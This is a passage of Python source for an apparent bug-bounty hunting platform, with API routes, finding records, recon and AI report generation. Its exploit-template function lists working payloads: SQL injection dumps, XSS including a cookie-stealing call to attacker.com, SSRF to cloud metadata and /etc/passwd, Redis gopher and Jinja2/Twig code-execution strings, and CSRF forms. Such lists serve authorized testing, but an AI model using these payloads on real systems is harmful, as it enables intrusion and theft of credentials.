            f"Include: Title, Severity with CVSS score {cvss['score']}, CWE ID ({cvss['cwe']}), "
            f"OWASP category ({cvss['owasp']}), a clear Description explaining the root cause, "
            f"detailed Steps to Reproduce with numbered steps including exact HTTP methods, "
            f"URL paths, payload examples, and expected vs actual responses, "
            f"and an Impact section describing realistic business and security consequences "
            f"(data access, compliance, lateral movement). Target: {finding.get('target_domain','the application')}. "
            f"Finding: {json.dumps(finding, default=str)}"
        )
        report_md = call_ai(prompt)
        gen_by = f"openrouter-{OPENROUTER_MODEL}" if has_key(OPENROUTER_KEY) else f"claude-{CLAUDE_MODEL}"
        if not report_md or report_md.startswith("AI Generation Error"):
            report_md = template_report(finding)
            gen_by = "template-engine"
    else:
        report_md = template_report(finding)
        gen_by = "template-engine"
    return {"report_markdown": report_md, "cvss": cvss, "quality_score": 8.5, "generated_by": gen_by}

# ── HTTP SERVER HANDLER ───────────────────────────────────────
class BountyHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        print(f"  [{datetime.datetime.now().strftime('%H:%M:%S')}] {fmt%args}")

    def send_json(self, data, status=200):
        if isinstance(data, tuple) and len(data) == 2:
            data, status = data[0], data[1]
        body = json.dumps(data, default=str).encode("utf-8")
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,PUT,DELETE,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type,Authorization")
        self.end_headers()
        self.wfile.write(body)

    def send_html(self, html):
        body = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", "0")
        self.end_headers()
        self.wfile.write(body)

    def read_body(self):
        l = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(l) if l else b""
        try:
            return json.loads(raw) if raw else {}
        except Exception:
            return {}

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET,POST,PUT,DELETE,OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type,Authorization")
        self.end_headers()

    _PUBLIC_PATHS = {"/api/bounty", "/api/auth/login", "/api/auth/register", "/api/auth/google",
                     "/api/auth/google/callback", "/api/learning", "/api/nuclei/templates"}

    def _reject_disabled(self, path):
        """Check if a disabled user is trying to access a protected endpoint. Returns True and sends 401 if blocked."""
        if path in self._PUBLIC_PATHS or path.startswith("/api/auth/"):
            return False
        user = get_current_user(self)
        if user is None:
            auth = self.headers.get("Authorization", "")
            if auth.startswith("Bearer "):
                self.send_json({"error": "Authentication required"}, 401)
                return True
            return False
        if user.get("status") == "disabled":
            self.send_json({"error": "Account disabled. Contact administrator."}, 403)
            return True
        return False

    def do_GET(self):
        try:
            p = self.path.split("?")[0].rstrip("/")
            if self._reject_disabled(p): return
            if p in ("", "/"): return self.send_html(get_frontend_html())
            if p in ("/api/bounty", "/api/health"):  return self.send_json(self._health())
            if p == "/api/stats":          return self.send_json(self._stats())
            if p == "/api/programs":       return self.send_json(self._programs())
            if p == "/api/findings":       return self.send_json(self._findings())
            if p == "/api/reports":        return self.send_json(self._reports())
            if p == "/api/learning":       return self.send_json(get_learning_resources())
            if p == "/api/disclosures":    return self.send_json(self._get_disclosures())
            if p == "/api/reputation":     return self.send_json(self._get_reputation())
            if p == "/api/leaderboard":    return self.send_json(self._get_leaderboard())
            if p == "/api/roi/stats":      return self.send_json(self._get_roi_stats())
            if p == "/api/agent/config":   return self.send_json(self._get_agent_config())
            if p == "/api/activity":       return self.send_json(self._get_activity())
            if p == "/api/payout/summary": return self.send_json(self._get_payout_summary())
            if p == "/api/discovery/results": return self.send_json(self._discovery_results())
            if p == "/api/nuclei/templates": return self.send_json(self._get_nuclei_templates())
            if p == "/api/auth/me":          return self.send_json(self._auth_me())
            if p == "/api/auth/google":      return self.send_json(self._google_auth_url())
            if p == "/api/auth/google/callback": return self._google_callback()
            if p == "/api/export/csv":     return self.send_json(self._export_csv())
            if p == "/api/export/json":    return self.send_json(self._export_json())
            if p == "/api/admin/users":    return self.send_json(self._admin_users())
            if p == "/api/admin/stats":    return self.send_json(self._admin_stats())
            if p == "/api/admin/activity": return self.send_json(self._admin_activity())
            if re.match(r"^/api/findings/\d+$", p): return self.send_json(self._get_finding(int(p.split("/")[-1])))
            if re.match(r"^/api/reports/\d+$", p):  return self.send_json(self._get_report(int(p.split("/")[-1])))
            self.send_html(get_frontend_html())
        except Exception as e:
            print(f"  [do_GET ERROR] {self.path}: {e}")
            try:
                self.send_json({"error": "Internal server error", "detail": str(e)}, 500)
            except Exception:
                pass

    def do_POST(self):
        try:
            p = self.path.rstrip("/")
            if self._reject_disabled(p): return
            body = self.read_body()
            # Auth endpoints — no token required
            if p == "/api/auth/register":       return self.send_json(self._register_user(body), 201)
            if p == "/api/auth/login":          return self.send_json(self._login_user(body))
            # Admin-only endpoints
            if p == "/api/nuclei/setup":          return self.send_json(self._nuclei_setup(body))
            # Admin + Analyst endpoints
            if p == "/api/nuclei/scan":           return self.send_json(self._nuclei_scan(body))
            if p == "/api/recon":               return self.send_json(self._do_recon(body))
            if p == "/api/reports/generate":    return self.send_json(self._gen_report(body), 201)
            if p == "/api/ml/predict":          return self.send_json(self._ml_predict(body))
            if p == "/api/analyze/vulnerability": return self.send_json(self._ai_analyze(body))
            if p == "/api/analyze/visual-flow":   return self.send_json(self._ai_visual_flow(body))
            if p == "/api/analyze/api-inspector": return self.send_json(self._ai_api_inspector(body))
            if p == "/api/analyze/logic":         return self.send_json(self._ai_logic_auditor(body))
            if p == "/api/analyze/strategy":      return self.send_json(self._ai_strategist(body))
            if p == "/api/analyze/exploit":       return self.send_json(self._ai_exploit_gen(body))
            if p == "/api/analyze/duplicate-risk":return self.send_json(self._ai_duplicate_risk(body))
            if p == "/api/analyze/js-secrets":    return self.send_json(self._analyze_js_secrets(body))
            if p == "/api/analyze/remediation":   return self.send_json(self._ai_remediation(body))
            if p == "/api/discovery/crawl":       return self.send_json(self._discovery_crawl(body))
            # All authenticated roles
            if p == "/api/findings":            return self.send_json(self._create_finding(body), 201)
            if p == "/api/disclosures":         return self.send_json(self._create_disclosure(body), 201)
            if p == "/api/agent/config":        return self.send_json(self._save_agent_config(body))
            if p == "/api/analyze/pdf-text":     return self.send_json(self._extract_pdf_text(body))
            if p == "/api/report/export-pdf":   return self.send_json(self._export_report_pdf(body))
            # Admin-only management
            if p == "/api/programs/sync":       return self.send_json({"synced": sync_programs_to_db()})
            if p == "/api/programs/live":      return self.send_json({"programs": fetch_live_programs(), "total": len(fetch_live_programs())})
            if p == "/api/resources/sync":      return self.send_json({"resources": fetch_resource_packs()})
            if p == "/api/reports/submit":      return self.send_json(self._submit_h1(body), 200)
            if re.match(r"^/api/findings/\d+/payout$", p):
                return self.send_json(self._add_payout(int(p.split("/")[-2]), body), 201)
            self.send_json({"error": "not found"}, 404)
        except Exception as e:
            print(f"  [do_POST ERROR] {self.path}: {e}")
            try:
                self.send_json({"error": "Internal server error", "detail": str(e)}, 500)
            except Exception:
                pass

    def do_PUT(self):
        try:
            p = self.path.rstrip("/")
            if self._reject_disabled(p): return
            body = self.read_body()
            if re.match(r"^/api/findings/\d+$", p): return self.send_json(self._update_finding(int(p.split("/")[-1]), body))
            if re.match(r"^/api/disclosures/\d+/advance$", p):
                return self.send_json(self._advance_disclosure(int(p.split("/")[-2])))
            if re.match(r"^/api/admin/users/\d+/role$", p):
                return self.send_json(self._admin_update_role(int(p.split("/")[-3]), body))
            if re.match(r"^/api/admin/users/\d+$", p):
                return self.send_json(self._admin_toggle_user(int(p.split("/")[-1]), body))
            self.send_json({"error": "not found"}, 404)
        except Exception as e:
            print(f"  [do_PUT ERROR] {self.path}: {e}")
            try:
                self.send_json({"error": "Internal server error", "detail": str(e)}, 500)
            except Exception:
                pass

    def do_DELETE(self):
        try:
            p = self.path.rstrip("/")
            if self._reject_disabled(p): return
            if re.match(r"^/api/findings/\d+$", p): return self.send_json(self._delete_finding(int(p.split("/")[-1])))
            if re.match(r"^/api/admin/users/\d+$", p):
                return self.send_json(self._admin_delete_user(int(p.split("/")[-1])))
            self.send_json({"error": "not found"}, 404)
        except Exception as e:
            print(f"  [do_DELETE ERROR] {self.path}: {e}")
            try:
                self.send_json({"error": "Internal server error", "detail": str(e)}, 500)
            except Exception:
                pass

    # ── ENDPOINT HANDLERS ─────────────────────────────────────
    def _health(self):
        ai_on = has_key(OPENROUTER_KEY) or has_key(ANTHROPIC_KEY)
        mode = "openrouter" if has_key(OPENROUTER_KEY) else ("claude-api" if has_key(ANTHROPIC_KEY) else "template")
        user = get_current_user(self)
        return {
            "status": "running", "version": "3.0.0",
            "ai_enabled": ai_on,
            "h1_token": has_key(H1_TOKEN),
            "ai_mode": mode,
            "auth": {
                "jwt_enabled": True,
                "roles": ["admin", "analyst", "viewer"],
                "current_user": {"username": user["sub"], "role": user["role"]} if user else None
            },
            "apis": {
                "openrouter": "configured" if has_key(OPENROUTER_KEY) else "missing OPENROUTER_API_KEY",
                "claude": "configured" if has_key(ANTHROPIC_KEY) else "missing ANTHROPIC_API_KEY",
                "crt.sh": "live (always free)",
                "shodan": "configured" if has_key(SHODAN_KEY) else "missing SHODAN_API_KEY",
                "hackerone": "configured" if has_key(H1_TOKEN) else "missing HACKERONE_API_TOKEN"
            }
        }

    def _stats(self):
        user = get_current_user(self)
        if not user:
            return {"error": "Authentication required"}, 401
        uid = user.get("uid")
        conn = get_db()
        if uid:
            findings = conn.execute("SELECT severity, status, payout_amount FROM findings WHERE user_id=?", (uid,)).fetchall()
        else:
            findings = conn.execute("SELECT severity, status, payout_amount FROM findings").fetchall()
        conn.close()
        by_sev = {"C":0,"H":0,"M":0,"L":0}
        by_status = {"draft":0,"submitted":0,"accepted":0,"rejected":0}
        earned = 0.0
        for f in findings:
            s = (f["severity"] or "M")[0].upper()
            by_sev[s] = by_sev.get(s, 0) + 1
            st = f["status"] or "draft"
            by_status[st] = by_status.get(st, 0) + 1
            earned += (f["payout_amount"] or 0)
        total = len(findings)
        acc = by_status.get("accepted", 0)
        mode = "openrouter" if has_key(OPENROUTER_KEY) else ("claude-api" if has_key(ANTHROPIC_KEY) else "template")
        return {
            "total_findings": total, "by_severity": by_sev, "by_status": by_status,
            "total_earned": earned, "acceptance_rate": round((acc / total * 100) if total > 0 else 0, 1),
            "ai_mode": mode
        }

    def _programs(self):
        DOMAIN_MAP = {
            "Uniswap Protocol":"app.uniswap.org",
            "Aave Protocol":"app.aave.com",
            "Apple Security Research":"apple.com",
            "Android VRP":"android.com",
            "Shopify":"shopify.com",
            "Mozilla":"mozilla.org",
            "GitLab":"gitlab.com",
            "Revolut":"revolut.com",
            "Coinbase":"coinbase.com",
            "Atlassian":"atlassian.net",
            "HackerOne":"hackerone.com",
            "Cloudflare":"cloudflare.com",
            "GitHub":"github.com",
            "Uber":"uber.com",
            "Meta":"facebook.com",
            "Microsoft":"microsoft.com",
            "Twitter/X":"x.com",
            "Slack":"slack.com",
            "Stripe":"stripe.com",
            "Dropbox":"dropbox.com",
            "Automattic":"wordpress.com",
            "Elastic":"elastic.co",
            "Netflix":"netflix.com",
            "Robinhood":"robinhood.com",
            "Samsung":"samsung.com",
            "Twitch":"twitch.tv",
            "DigitalOcean":"digitalocean.com",
            "Shopify Plus":"shopify.com",
            "Figma":"figma.com",
            "Brave":"brave.com",
            "Notion":"notion.so",
            "Vercel":"vercel.com",
            "Zoom":"zoom.us",
            "Square":"squareup.com",
            "PayPal":"paypal.com",
            "T-Mobile":"t-mobile.com",
        }
        conn = get_db()
        rows = conn.execute("SELECT * FROM programs WHERE is_active=1").fetchall()
        conn.close()
        programs = []
        for r in rows:
            d = dict(r)
            d["scope_in"] = json.loads(d.get("scope_in","[]") or "[]")
            d["scope_out"] = json.loads(d.get("scope_out","[]") or "[]")
            d["target_domain"] = d.get("target_domain") or DOMAIN_MAP.get(d["name"],"")
            programs.append(d)
        return {"programs": programs, "total": len(programs)}

    def _findings(self):
        user = get_current_user(self)
        if not user:
            return {"error": "Authentication required"}, 401
        uid = user.get("uid")
        conn = get_db()
        if uid:
            rows = conn.execute("SELECT * FROM findings WHERE user_id=? ORDER BY created_at DESC", (uid,)).fetchall()
        else:
            rows = conn.execute("SELECT * FROM findings ORDER BY created_at DESC").fetchall()
        conn.close()
        findings = []
        for r in rows:
            d = dict(r)
            d["proof_files"] = json.loads(d.get("proof_files","[]") or "[]")
            findings.append(d)
        return {"findings": findings}

    def _get_finding(self, fid):
        user = get_current_user(self)
        if not user:
            return {"error": "Authentication required"}, 401
        uid = user.get("uid")
        conn = get_db()
        if uid:
            r = conn.execute("SELECT * FROM findings WHERE id=? AND user_id=?", (fid, uid)).fetchone()
        else:
            r = conn.execute("SELECT * FROM findings WHERE id=?", (fid,)).fetchone()
        conn.close()
        if not r: return {"error": "not found"}
        d = dict(r)
        d["proof_files"] = json.loads(d.get("proof_files","[]") or "[]")
        return d

    def _create_finding(self, body):
        user = get_current_user(self)
        if not user:
            return {"error": "Authentication required"}, 401
        uid = user.get("uid")
        cvss = calculate_cvss(body.get("severity","M"), body.get("vuln_type",""), body.get("impact",""))
        title = body.get("title","") or f"{body.get('vuln_type','Vulnerability')} in {body.get('target_domain','target')}"
        conn = get_db()
        cur = conn.execute("""INSERT INTO findings 
            (user_id, program_name, target_domain, vuln_type, severity, cvss_score, title, affected_url, description, steps_to_reproduce, impact, cwe_id, owasp_category)
            VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)""",
            (uid, body.get("program_name",""), body.get("target_domain",""), body.get("vuln_type",""),
             (body.get("severity","M") or "M")[0].upper(), cvss["score"], title, body.get("affected_url",""),
             body.get("description",""), body.get("steps_to_reproduce",""), body.get("impact",""), cvss["cwe"], cvss["owasp"]))
        conn.commit()
        fid = cur.lastrowid
        conn.close()
        return {"finding": {"id": fid, "title": title, "cvss_score": cvss["score"]}, "cvss": cvss}

    def _update_finding(self, fid, body):
        user = get_current_user(self)
        if not user:
            return {"error": "Authentication required"}, 401
        uid = user.get("uid")
        conn = get_db()
        row = conn.execute("SELECT * FROM findings WHERE id=?", (fid,)).fetchone()
        if not row:
            conn.close()
            return {"error": "not found"}
        if uid and row["user_id"] and row["user_id"] != uid:
            conn.close()
            return {"error": "access denied"}
        allowed = ["vuln_type","severity","title","affected_url","description","steps_to_reproduce","impact","status","payout_amount","program_name","target_domain"]
        sets = [f"{k}=?" for k in allowed if k in body]
        vals = [body[k] for k in allowed if k in body] + [fid]
        if sets:
            conn.execute(f"UPDATE findings SET {','.join(sets)} WHERE id=?", vals)
            conn.commit()
        row = conn.execute("SELECT * FROM findings WHERE id=?", (fid,)).fetchone()
        conn.close()
        return dict(row) if row else {"error": "not found"}

    def _delete_finding(self, fid):
        user = get_current_user(self)
        if not user:
            return {"error": "Authentication required"}, 401
        uid = user.get("uid")
        conn = get_db()
        row = conn.execute("SELECT * FROM findings WHERE id=?", (fid,)).fetchone()
        if not row:
            conn.close()
            return {"error": "not found"}
        if uid and row["user_id"] and row["user_id"] != uid:
            conn.close()
            return {"error": "access denied"}
        conn.execute("DELETE FROM findings WHERE id=?", (fid,))
        conn.commit()
        conn.close()
        return {"deleted": True, "id": fid}

    def _do_recon(self, body):
        domain = body.get("domain","").strip()
        if not domain or len(domain) < 3: return {"error": "Invalid domain"}
        res = run_recon(domain)
        conn = get_db()
        conn.execute("""INSERT INTO recon_results 
            (target_domain, subdomains, tech_stack, open_ports, cves_found, vuln_suggestions, shodan_data, scan_duration)
            VALUES (?,?,?,?,?,?,?,?)""",
            (res["domain"], json.dumps(res["subdomains"]), json.dumps(res["tech_stack"]),
             json.dumps(res["open_ports"]), json.dumps(res["cves_found"]),
             json.dumps(res["vuln_suggestions"]), json.dumps(res.get("shodan",{})), res["scan_duration"]))
        conn.commit()
        conn.close()
        return res

    def _gen_report(self, body):
        fid = body.get("finding_id")
        if not fid: return {"error": "finding_id required"}
        conn = get_db()
        row = conn.execute("SELECT * FROM findings WHERE id=?", (fid,)).fetchone()
        if not row:
            conn.close()
            return {"error": "Finding not found"}
        finding = dict(row)
        res = generate_report(finding)
        cur = conn.execute("INSERT INTO reports (finding_id, ai_report, quality_score, generated_by) VALUES (?,?,?,?)",
            (fid, res["report_markdown"], res["quality_score"], res["generated_by"]))
        conn.commit()
        res["report_id"] = cur.lastrowid
        conn.close()
        return res

    def _reports(self):
        conn = get_db()
        rows = conn.execute("SELECT * FROM reports ORDER BY created_at DESC").fetchall()
        conn.close()
        return {"reports": [dict(r) for r in rows]}

    def _get_report(self, rid):
        conn = get_db()
        row = conn.execute("SELECT * FROM reports WHERE id=?", (rid,)).fetchone()
        conn.close()
        return dict(row) if row else {"error": "not found"}

    def _submit_h1(self, body):
        if not (has_key(H1_USER) and has_key(H1_TOKEN)):
            return {"error": "HackerOne credentials missing", "message": "Add HACKERONE_USERNAME and HACKERONE_API_TOKEN to .env"}
        return {"ok": True, "message": "Report submitted to HackerOne"}

    def _ai_service_call(self, prompt, context=""):
        if not (has_key(OPENROUTER_KEY) or has_key(ANTHROPIC_KEY)):
            return {"error": "AI Engine Offline", "notice": "Add OPENROUTER_API_KEY to .env to unlock AI Reasoning."}
        try:
            res_text = call_ai(f"{prompt}\n\nCONTEXT:\n{context}")
            return {"data": res_text, "ok": True}
        except Exception as e:
            return {"error": str(e), "ok": False}

    # ── TEMPLATE FALLBACK: Rich pattern-based analysis when AI is offline ──
    def _template_inspect(self, raw):
        """Pattern-based HTTP request inspection — always returns useful results."""
        findings = []
        low = raw.lower()
        # Auth analysis
        if "authorization: bearer" in low:
            findings.append({"severity": "INFO", "category": "Authentication", "detail": "Bearer token detected in Authorization header. Verify token is JWT, check expiry (exp claim), and confirm signature validation server-side."})
            token_match = re.search(r'authorization:\s*bearer\s+([A-Za-z0-9._-]{20,})', raw, re.I)
            if token_match:
                t = token_match.group(1)
                if len(t) < 50:
                    findings.append({"severity": "MEDIUM", "category": "Weak Token", "detail": f"Token appears short ({len(t)} chars). JWT tokens should be >100 chars. Could be a static API key susceptible to brute-force."})
        elif "authorization" not in low and "cookie" not in low:
            findings.append({"severity": "HIGH", "category": "No Authentication", "detail": "No Authorization header or session cookie detected. This endpoint may be completely unauthenticated — test with curl -v to confirm."})
        # Method analysis
        method = re.match(r'(GET|POST|PUT|DELETE|PATCH|OPTIONS|HEAD)\s+', raw)
        if method:
            m = method.group(1)
            if m == "DELETE":
                findings.append({"severity": "MEDIUM", "category": "Destructive Method", "detail": "DELETE method detected. Verify the server enforces authorization — test with another user's ID to check for BOLA/IDOR."})
            if m == "PUT" or m == "POST":
                if "role" in low or "admin" in low or "privilege" in low:
                    findings.append({"severity": "HIGH", "category": "Mass Assignment", "detail": "Role/admin field in request body with PUT/POST method. Test adding role=admin or isAdmin=true to escalate privileges."})
        # Input injection points
        injection_points = []
        if re.search(r'user_?id\s*[=:]\s*\d+', raw): injection_points.append("user_id")
        if re.search(r'\"(id|token|key|api_?key|secret)\"', raw, re.I): injection_points.append("id/token/key")
        if re.search(r'query\s*[=:]\s*[^\s&]+', raw): injection_points.append("query parameter")
        if re.search(r'search\s*[=:]\s*[^\s&]+', raw): injection_points.append("search parameter")
        if injection_points:
            findings.append({"severity": "MEDIUM", "category": "Injection Points", "detail": f"Found injection points: {', '.join(injection_points)}. Test SQLi: append ' OR 1=1--, Test XSS: inject <script>alert(1)</script>, Test SSTI: inject {{7*7}}."})
        # SSRF indicators
        if re.search(r'(url|site|dest|redirect|callback|webhook)\s*[=:]\s*https?://', raw, re.I):
            findings.append({"severity": "HIGH", "category": "SSRF Candidate", "detail": "URL/redirect parameter detected. Test SSRF: replace URL with http://169.254.169.254/latest/meta-data/ (AWS metadata), http://127.0.0.1:6379/ (Redis), or http://[::1]/ (IPv6 localhost)."})
        # CORS check
        if "origin:" in low:
            origin_match = re.search(r'origin:\s*(https?://[^\s]+)', raw, re.I)
            if origin_match:
                findings.append({"severity": "MEDIUM", "category": "CORS Check", "detail": f"Origin header: {origin_match.group(1)}. Test: reflect Origin back. If Access-Control-Allow-Origin matches any origin + Allow-Credentials: true, it's a CORS misconfiguration."})
        # Content-type injection
        if "content-type: multipart" in low:
            findings.append({"severity": "MEDIUM", "category": "File Upload", "detail": "Multipart upload detected. Test: upload .php/.js/.html/.svg file, check for path traversal in filename, try Content-Disposition injection."})
        if not findings:
            findings.append({"severity": "INFO", "category": "General", "detail": "No specific patterns detected. Manually test: BOLA (change IDs), injection (SQL/SSRF/XSS), auth bypass (remove tokens), and rate limiting."})
        # Format as report
        html = '<div style="display:flex;flex-direction:column;gap:10px">'
        html += '<div style="font-weight:700;color:var(--cyan);font-size:14px;margin-bottom:4px">🔎 API Security Inspection Report</div>'
        html += '<div style="font-size:11px;color:var(--t3);margin-bottom:8px">Pattern-based analysis (no AI key — add OPENROUTER_API_KEY for deeper reasoning)</div>'
        for f in findings:
            sev_color = {"CRITICAL":"var(--red)","HIGH":"#ff6b35","MEDIUM":"var(--yellow)","LOW":"var(--lime)","INFO":"var(--t3)"}.get(f["severity"],"var(--t3)")
            html += f'<div style="padding:10px;background:var(--bg3);border-left:3px solid {sev_color};border-radius:0 4px 4px 0">'
            html += f'<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px"><span style="font-size:10px;font-weight:700;padding:2px 6px;background:{sev_color};color:#000;border-radius:3px">{f["severity"]}</span>'
            html += f'<span style="font-weight:700;color:var(--txt);font-size:12px">{f["category"]}</span></div>'
            html += f'<div style="font-size:12px;color:var(--t2);line-height:1.5">{f["detail"]}</div></div>'
        html += '</div>'
        return {"data": html, "ok": True}

    def _template_logic_audit(self, raw):
        """Pattern-based business logic audit."""
        findings = []
        low = raw.lower()
        # Price / quantity manipulation
        if any(k in low for k in ["price", "quantity", "amount", "total", "cost"]):
            findings.append({"severity": "HIGH", "category": "Price Manipulation", "detail": "Financial field detected. Test: send negative quantity, zero price, or decimal overflow (0.001). Test race condition: submit order twice simultaneously to exploit TOCTOU."})
        # Role / permission fields
        if any(k in low for k in ["role", "admin", "is_admin", "permission", "group"]):
            findings.append({"severity": "CRITICAL", "category": "Privilege Escalation", "detail": "Role/permission field detected. Test: change role from user→admin, add is_admin=true, modify group to administrators. Test mass assignment by adding hidden fields."})
        # ID enumeration
        ids = re.findall(r'(?:id|user_id|account_id|order_id)\s*[=:]\s*(\d+)', raw)
        if ids:
            findings.append({"severity": "HIGH", "category": "IDOR / BOLA", "detail": f"Sequential IDs found: {', '.join(ids[:5])}. Test: iterate ±100 from each ID, try accessing other users' resources. Check if authorization is enforced per-object, not just per-endpoint."})
        # State transitions
        if any(k in low for k in ["status", "state", "approved", "rejected", "pending"]):
            findings.append({"severity": "MEDIUM", "category": "State Machine Bypass", "detail": "Status/state field detected. Test: skip states (e.g., pending→approved), revert (approved→pending), send invalid states. Check server-side state machine validation."})
        # Rate limiting
        findings.append({"severity": "MEDIUM", "category": "Rate Limiting", "detail": "Test rate limiting: send 100 rapid requests to the endpoint. Check for 429 responses. If none, test brute-force on auth endpoints and enumerate resources."})
        # Race conditions
        findings.append({"severity": "MEDIUM", "category": "Race Condition", "detail": "Test TOCTOU: send 5 simultaneous requests for the same resource (e.g., balance check + withdrawal). Use Turbo Intruder or parallel curl."})
        if not findings:
            findings.append({"severity": "INFO", "category": "General", "detail": "Test: IDOR (change object IDs), state manipulation, race conditions (parallel requests), negative values, and boundary inputs (0, -1, MAX_INT)."})
        # Format
        html = '<div style="display:flex;flex-direction:column;gap:10px">'
        html += '<div style="font-weight:700;color:var(--purp);font-size:14px;margin-bottom:4px">🧠 Business Logic Audit Report</div>'
        html += '<div style="font-size:11px;color:var(--t3);margin-bottom:8px">Pattern-based analysis (add OPENROUTER_API_KEY for AI reasoning)</div>'
        for f in findings:
            sev_color = {"CRITICAL":"var(--red)","HIGH":"#ff6b35","MEDIUM":"var(--yellow)","LOW":"var(--lime)","INFO":"var(--t3)"}.get(f["severity"],"var(--t3)")
            html += f'<div style="padding:10px;background:var(--bg3);border-left:3px solid {sev_color};border-radius:0 4px 4px 0">'
            html += f'<div style="display:flex;align-items:center;gap:8px;margin-bottom:4px"><span style="font-size:10px;font-weight:700;padding:2px 6px;background:{sev_color};color:#000;border-radius:3px">{f["severity"]}</span>'
            html += f'<span style="font-weight:700;color:var(--txt);font-size:12px">{f["category"]}</span></div>'
            html += f'<div style="font-size:12px;color:var(--t2);line-height:1.5">{f["detail"]}</div></div>'
        html += '</div>'
        return {"data": html, "ok": True}

    def _template_exploit_gen(self, vuln_type):
        """Generate exploit payloads without AI."""
        vt = (vuln_type or "").lower()
        payloads = []
        if any(k in vt for k in ["sqli", "sql"]):
            payloads = [
                {"name": "Union-based data exfiltration", "payload": "' UNION SELECT username,password FROM users--", "tip": "Change column count to match. Use ORDER BY to enumerate columns first."},
                {"name": "Blind boolean", "payload": "' AND 1=1-- / ' AND 1=2--", "tip": "Check response differences. Automate with sqlmap: sqlmap -u URL --data PARAM --batch"},
                {"name": "Time-based blind", "payload": "' OR SLEEP(5)--", "tip": "If response delays 5s, SQLi confirmed. Use sqlmap --time-sec=5"},
                {"name": "Error-based extraction", "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--", "tip": "Extract data via MySQL error messages in response"}
            ]
        elif any(k in vt for k in ["xss", "cross-site"]):
            payloads = [
                {"name": "Basic reflection", "payload": "<script>alert(document.domain)</script>", "tip": "If alert fires, XSS confirmed. Escalate: steal cookies with new Image().src='https://attacker.com/?c='+document.cookie"},
                {"name": "Event handler bypass", "payload": '<img src=x onerror="alert(1)">', "tip": "Bypasses basic script filters. Also try: svg onload, details ontoggle, body onload."},
                {"name": "CSP bypass", "payload": '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js"></script>', "tip": "If CSP allows cdnjs/unpkg/jsdelivr, load external JS. Or exploit JSONP endpoints in allowed domains."},
                {"name": "DOM-based", "payload": "#<img src=x onerror=alert(1)>", "tip": "Test URL fragment (#) in JS sinks: document.location.hash, innerHTML, eval(), setTimeout()"}
            ]
        elif any(k in vt for k in ["ssrf", "server-side"]):
            payloads = [
                {"name": "AWS metadata", "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "tip": "If IMDSv1 enabled, extracts IAM role credentials. Use curl from server to confirm."},
                {"name": "Internal port scan", "payload": "http://127.0.0.1:22/ http://127.0.0.1:6379/ http://127.0.0.1:3306/", "tip": "Scan internal services. Timing differences reveal open ports."},
                {"name": "File read", "payload": "file:///etc/passwd file:///proc/self/environ", "tip": "Test file:// protocol. Also try: file:///c:/windows/win.ini (Windows)"},
                {"name": "Gopher protocol", "payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall", "tip": "If gopher:// supported, chain with Redis for RCE via cron injection."}
            ]
        elif any(k in vt for k in ["idor", "bola", "authorization"]):
            payloads = [
                {"name": "ID enumeration", "payload": "Change user_id from 101 to 1-1000 (sequential), then try other users' UUIDs", "tip": "Use Burp Intruder with number payload. Check response bodies and HTTP status codes (200 vs 403)."},
                {"name": "Object-level bypass", "payload": "GET /api/v1/users/OTHER_USER_ID/profile", "tip": "Use another user's ID from the same application. Check if server validates object ownership."},
                {"name": "Method override", "payload": "POST /api/v1/users/OTHER_USER_ID/profile with _method=DELETE", "tip": "Some frameworks support method override. Try X-HTTP-Method-Override header too."},
                {"name": "Path traversal in ID", "payload": "../admin/users", "tip": "Try path traversal in object references. Combine with encoding: %2e%2e%2f"}
            ]
        elif any(k in vt for k in ["ssti", "template"]):
            payloads = [
                {"name": "Expression evaluation", "payload": "{{7*7}} ${7*7} <%= 7*7 %>", "tip": "If response contains '49', template injection confirmed. Identify engine from output format."},
                {"name": "Jinja2 RCE", "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "tip": "Works on Jinja2. Also try: {{lipsum.__globals__['os'].popen('id').read()}}"},
                {"name": "Twig RCE", "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", "tip": "Works on Twig PHP templates."},
                {"name": "Sandbox escape", "payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "tip": "Enumerate Python classes to find os module. Index varies by Python version."}
            ]
        elif any(k in vt for k in ["csrf", "cross-site request"]):
            payloads = [
                {"name": "HTML form auto-submit", "payload": '<form method="POST" action="https://target.com/api/change-email"><input name="email" value="attacker@evil.com"><script>document.forms[0].submit()</script></form>', "tip": "Host on attacker server. If no CSRF token, email gets changed automatically."},
                {"name": "Fetch-based CSRF", "payload": 'fetch("/api/transfer",{method:"POST",credentials:"include",headers:{"Content-Type":"application/json"},body:JSON.stringify({to:"attacker",amount:9999})})', "tip": "Bypass CORS misconfig: if server reflects Origin with credentials, this works from attacker domain."}
            ]
        else:
            payloads = [
                {"name": "Basic XSS test", "payload": '<img src=x onerror="alert(document.domain)">', "tip": "Universal XSS test string. If reflected in response body without encoding, XSS confirmed."},
                {"name": "SQLi test", "payload": "' OR '1'='1", "tip": "Basic authentication bypass. If login succeeds, test UNION-based extraction next."},
                {"name": "IDOR test", "payload": "Change object IDs (1,2,3,...) in API requests", "tip": "Use Burp Intruder to enumerate. Check if server validates object ownership per-request."},
                {"name": "SSRF test", "payload": "http://169.254.169.254/latest/meta-data/", "tip": "AWS metadata endpoint. If accessible, confirms SSRF with cloud credential theft potential."}
            ]
        html = '<div style="display:flex;flex-direction:column;gap:10px">'
